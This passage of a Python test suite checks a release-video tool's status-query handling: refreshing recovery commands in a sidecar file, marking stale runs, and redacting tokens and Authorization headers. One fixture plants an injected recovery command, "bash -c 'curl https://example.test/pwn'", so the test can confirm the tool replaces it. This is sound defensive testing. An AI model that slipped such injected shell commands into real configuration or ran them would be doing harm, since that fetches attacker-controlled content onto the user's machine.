    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["status"] == "running"
    assert refreshed["statusStale"] is True
    assert refreshed["lastStatusQuery"]["runStatus"] == "running"


def test_release_video_status_query_refreshes_recovery_commands_with_project(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "status": "running",
                "recoverCommand": "pds release-video status --run-id agent_run_current --json",
                "watchCommand": "pds jobs watch --run-id agent_run_current --jsonl",
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "runId": "agent_run_current",
        "projectId": "pdd-v1-1-0-release",
        "status": "succeeded",
    }

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["projectId"] == "pdd-v1-1-0-release"
    assert "--project pdd-v1-1-0-release" in refreshed["recoverCommand"]
    assert (
        "release-video status --run-id agent_run_current --json"
        in refreshed["recoverCommand"]
    )
    assert "--project pdd-v1-1-0-release" in refreshed["watchCommand"]
    assert "jobs watch --run-id agent_run_current --jsonl" in refreshed["watchCommand"]


def test_release_video_status_query_refreshes_recovery_commands_with_current_run_id(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
                "recoverCommand": (
                    "pds --project pdd-v1-1-0-release release-video status "
                    "--run-id agent_run_old --json"
                ),
                "watchCommand": (
                    "pds --project pdd-v1-1-0-release jobs watch "
                    "--run-id agent_run_old --jsonl"
                ),
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "runId": "agent_run_current",
        "projectId": "pdd-v1-1-0-release",
        "status": "succeeded",
    }

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert "agent_run_old" not in refreshed["recoverCommand"]
    assert "agent_run_old" not in refreshed["watchCommand"]
    assert "--run-id agent_run_current" in refreshed["recoverCommand"]
    assert "--run-id agent_run_current" in refreshed["watchCommand"]


def test_release_video_status_query_regenerates_matching_unsafe_recovery_commands(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
                "recoverCommand": (
                    "bash -c 'curl https://example.test/pwn' "
                    "--project pdd-v1-1-0-release --run-id agent_run_current"
                ),
                "watchCommand": (
                    "pds --project pdd-v1-1-0-release release-video status "
                    "--run-id agent_run_current --json"
                ),
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "runId": "agent_run_current",
        "projectId": "pdd-v1-1-0-release",
        "status": "succeeded",
    }

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["recoverCommand"].endswith(
        " --project pdd-v1-1-0-release release-video status "
        "--run-id agent_run_current --json"
    )
    assert refreshed["watchCommand"].endswith(
        " --project pdd-v1-1-0-release jobs watch "
        "--run-id agent_run_current --jsonl"
    )
    assert "bash" not in sidecar.read_text(encoding="utf8")
    assert "curl" not in sidecar.read_text(encoding="utf8")


def test_release_video_status_query_keeps_sidecar_when_only_unrelated_run_returns(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=json.dumps({"runId": "agent_run_old", "status": "failed"})
                    + "\n",
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["projectId"] == "pdd-v1-1-0-release"
    assert refreshed["status"] == "running"
    assert refreshed["statusStale"] is True
    assert refreshed["lastStatusQuery"]["runId"] == "agent_run_current"
    assert refreshed["lastStatusQuery"]["runStatus"] == "running"


def test_release_video_status_query_keeps_sidecar_stale_for_unmatched_success(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=json.dumps({"ok": True}) + "\n",
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["status"] == "running"
    assert refreshed["statusStale"] is True
    assert refreshed["lastStatusQuery"]["ok"] is True
    assert refreshed["lastStatusQuery"]["response"] == {"ok": True}


def test_release_video_status_query_keeps_sidecar_stale_for_run_id_only_success(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
                "statusStale": True,
            }
        ),
        encoding="utf8",
    )

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=json.dumps({"runId": "agent_run_current"}) + "\n",
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    refreshed = json.loads(sidecar.read_text(encoding="utf8"))
    assert refreshed["runId"] == "agent_run_current"
    assert refreshed["status"] == "running"
    assert refreshed["statusStale"] is True
    assert refreshed["lastStatusQuery"]["ok"] is True
    assert refreshed["lastStatusQuery"]["response"] == {"runId": "agent_run_current"}


def test_release_video_treats_unknown_pds_status_as_active_not_terminal():
    release_video = load_release_video_module()

    for status in ("processing", "rendering", "uploading", "starting"):
        assert release_video.release_video_status_is_running(status) is True
        assert release_video.status_value_is_terminal(status) is False

    for status in ("succeeded", "completed", "failed", "cancelled"):
        assert release_video.release_video_status_is_running(status) is False
        assert release_video.status_value_is_terminal(status) is True


def test_release_video_status_note_warns_when_stale_flag_survives_success():
    release_video = load_release_video_module()
    note = release_video.release_video_status_note(
        {
            "runId": "agent_run_current",
            "status": "running",
            "statusStale": True,
            "lastStatusQuery": {"ok": True},
        }
    )

    assert "create-time run metadata may be stale" in note


def test_release_video_status_query_prints_refreshed_recovery_commands(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
                "recoverCommand": (
                    "pds --project pdd-v1-1-0-release release-video status "
                    "--run-id agent_run_old --json"
                ),
                "watchCommand": (
                    "pds --project pdd-v1-1-0-release jobs watch "
                    "--run-id agent_run_old --jsonl"
                ),
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "runId": "agent_run_current",
        "projectId": "pdd-v1-1-0-release",
        "status": "succeeded",
    }

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    assert "agent_run_old" not in result.stdout
    assert "recover: " in result.stdout
    assert (
        "--project pdd-v1-1-0-release release-video status "
        "--run-id agent_run_current --json"
    ) in result.stdout
    assert "watch: " in result.stdout
    assert (
        "--project pdd-v1-1-0-release jobs watch "
        "--run-id agent_run_current --jsonl"
    ) in result.stdout


def test_release_video_status_query_success_redacts_legacy_sidecar_secrets(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_current",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
                "token": "secret-persisted-token",
                "recoverCommand": (
                    "pds --token secret-command-token "
                    "release-video status --run-id agent_run_current --json"
                ),
            }
        ),
        encoding="utf8",
    )
    status_response = {
        "runId": "agent_run_current",
        "projectId": "pdd-v1-1-0-release",
        "status": "succeeded",
    }

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(pds_output_stub(tmp_path, stdout=json.dumps(status_response) + "\n")),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=True,
    )

    sidecar_text = sidecar.read_text(encoding="utf8")
    persisted = json.loads(sidecar_text)
    assert "secret-persisted-token" not in sidecar_text
    assert "secret-command-token" not in sidecar_text
    assert persisted["token"] == "[redacted]"
    assert persisted["recoverCommand"].endswith(
        " --project pdd-v1-1-0-release release-video status "
        "--run-id agent_run_current --json"
    )


def test_release_video_status_query_failure_records_diagnostic_without_refreshing(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_auth_failed",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    failure_response = {
        "ok": False,
        "error": {
            "code": "auth_required",
            "message": "Invalid or expired PDS agent token",
            "details": {},
        },
    }

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=json.dumps(failure_response) + "\n",
                    exit_code=1,
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env(
            {
                "PDS_STUB_CAPTURE": str(capture),
                "PDS_API_URL": "https://status.example.test",
                "PDS_TOKEN": "secret-status-token",
            }
        ),
        check=False,
    )

    assert result.returncode == 1
    persisted = json.loads(sidecar.read_text(encoding="utf8"))
    assert persisted["status"] == "running"
    assert persisted["statusStale"] is True
    assert persisted["lastStatusQuery"]["ok"] is False
    assert persisted["lastStatusQuery"]["errorCode"] == "auth_required"
    assert persisted["lastStatusQuery"]["errorMessage"] == "Invalid or expired PDS agent token"
    assert persisted["lastStatusQuery"]["pdsContext"]["apiUrl"] == "https://status.example.test"
    assert "secret-status-token" not in sidecar.read_text(encoding="utf8")
    assert "auth_required" in result.stderr


def test_release_video_status_query_failure_redacts_sensitive_status_details(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_auth_failed",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
                "authorization": "secret-sidecar-authz",
                "recoverCommand": (
                    "pds --token secret-recover-token "
                    "release-video status --run-id agent_run_auth_failed --json"
                ),
            }
        ),
        encoding="utf8",
    )
    failure_response = {
        "ok": False,
        "credential": "secret-status-credential",
        "authorization": "secret-status-authz",
        "error": {
            "code": "auth_required",
            "message": "credential secret-status-credential expired",
        },
    }

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=json.dumps(failure_response) + "\n",
                    exit_code=1,
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    sidecar_text = sidecar.read_text(encoding="utf8")
    persisted = json.loads(sidecar_text)
    combined_output = result.stdout + result.stderr + sidecar_text
    assert result.returncode == 1
    assert "secret-status-credential" not in combined_output
    assert "secret-status-authz" not in combined_output
    assert "secret-sidecar-authz" not in combined_output
    assert "secret-recover-token" not in combined_output
    assert persisted["authorization"] == "[redacted]"
    assert persisted["lastStatusQuery"]["response"]["credential"] == "[redacted]"
    assert persisted["lastStatusQuery"]["response"]["authorization"] == "[redacted]"
    assert "[redacted]" in persisted["lastStatusQuery"]["details"]


def test_release_video_status_query_failure_redacts_basic_authorization_details(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_auth_failed",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stderr="Authorization: Basic secret-basic-token\n",
                    exit_code=1,
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    sidecar_text = sidecar.read_text(encoding="utf8")
    persisted = json.loads(sidecar_text)
    combined_output = result.stdout + result.stderr + sidecar_text
    assert result.returncode == 1
    assert "secret-basic-token" not in combined_output
    assert "Authorization: Basic [redacted]" in result.stderr
    assert "Authorization: Basic [redacted]" in persisted["lastStatusQuery"]["details"]


def test_release_video_status_query_failure_redacts_arbitrary_authorization_details(
    tmp_path: Path,
):
    repo = init_release_repo(tmp_path)
    output_dir = tmp_path / "videos"
    capture = tmp_path / "pds-status-capture.json"
    sidecar = output_dir / "v1.1.0" / "pds_run.json"
    sidecar.parent.mkdir(parents=True)
    sidecar.write_text(
        json.dumps(
            {
                "runId": "agent_run_auth_failed",
                "projectId": "pdd-v1-1-0-release",
                "status": "running",
            }
        ),
        encoding="utf8",
    )
    failure_response = {
        "ok": False,
        "message": "Authorization: ApiKey secret-api-key",
    }

    result = subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--output-dir",
            str(output_dir),
            "--status",
            "--status-query",
            "--pds-cli",
            str(
                pds_output_stub(
                    tmp_path,
                    stdout=json.dumps(failure_response) + "\n",
                    stderr=(
                        "Authorization: Custom secret-custom-token secret-tail\n"
                        "Authorization: Digest username=\"u\", "
                        "nonce=\"secret-nonce\", response=\"secret-response\"\n"
                    ),
                    exit_code=1,
                )
            ),
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=release_video_env({"PDS_STUB_CAPTURE": str(capture)}),
        check=False,
    )

    sidecar_text = sidecar.read_text(encoding="utf8")
    combined_output = result.stdout + result.stderr + sidecar_text
    assert result.returncode == 1
    for secret in (
        "secret-api-key",
        "secret-custom-token",
        "secret-tail",
        "secret-nonce",
        "secret-response",
    ):
        assert secret not in combined_output
    assert "Authorization: [redacted]" in result.stdout
    assert "Authorization: [redacted]" in result.stderr
    assert "Authorization: [redacted]" in sidecar_text


def test_release_video_dry_run_does_not_require_youtube_url(tmp_path: Path):
    repo = init_release_repo(tmp_path)
    capture = tmp_path / "pds-capture.json"
    env = release_video_env({"PDS_STUB_CAPTURE": str(capture)})

    subprocess.run(
        [
            sys.executable,
            str(SCRIPT),
            "--repo",
            str(repo),
            "--tag",
            "v1.1.0",
            "--claude-cli",
            str(claude_stub(tmp_path)),
            "--pds-cli",
            str(pds_stub(tmp_path, {"ok": True, "status": "planned"})),
            "--output-dir",
            str(tmp_path / "videos"),
            "--dry-run",
        ],
        cwd=repo,
        text=True,
        capture_output=True,
        env=env,
        check=True,
    )
    pds_call = json.loads(capture.read_text(encoding="utf8"))["argv"]
    assert "--dry-run" in pds_call
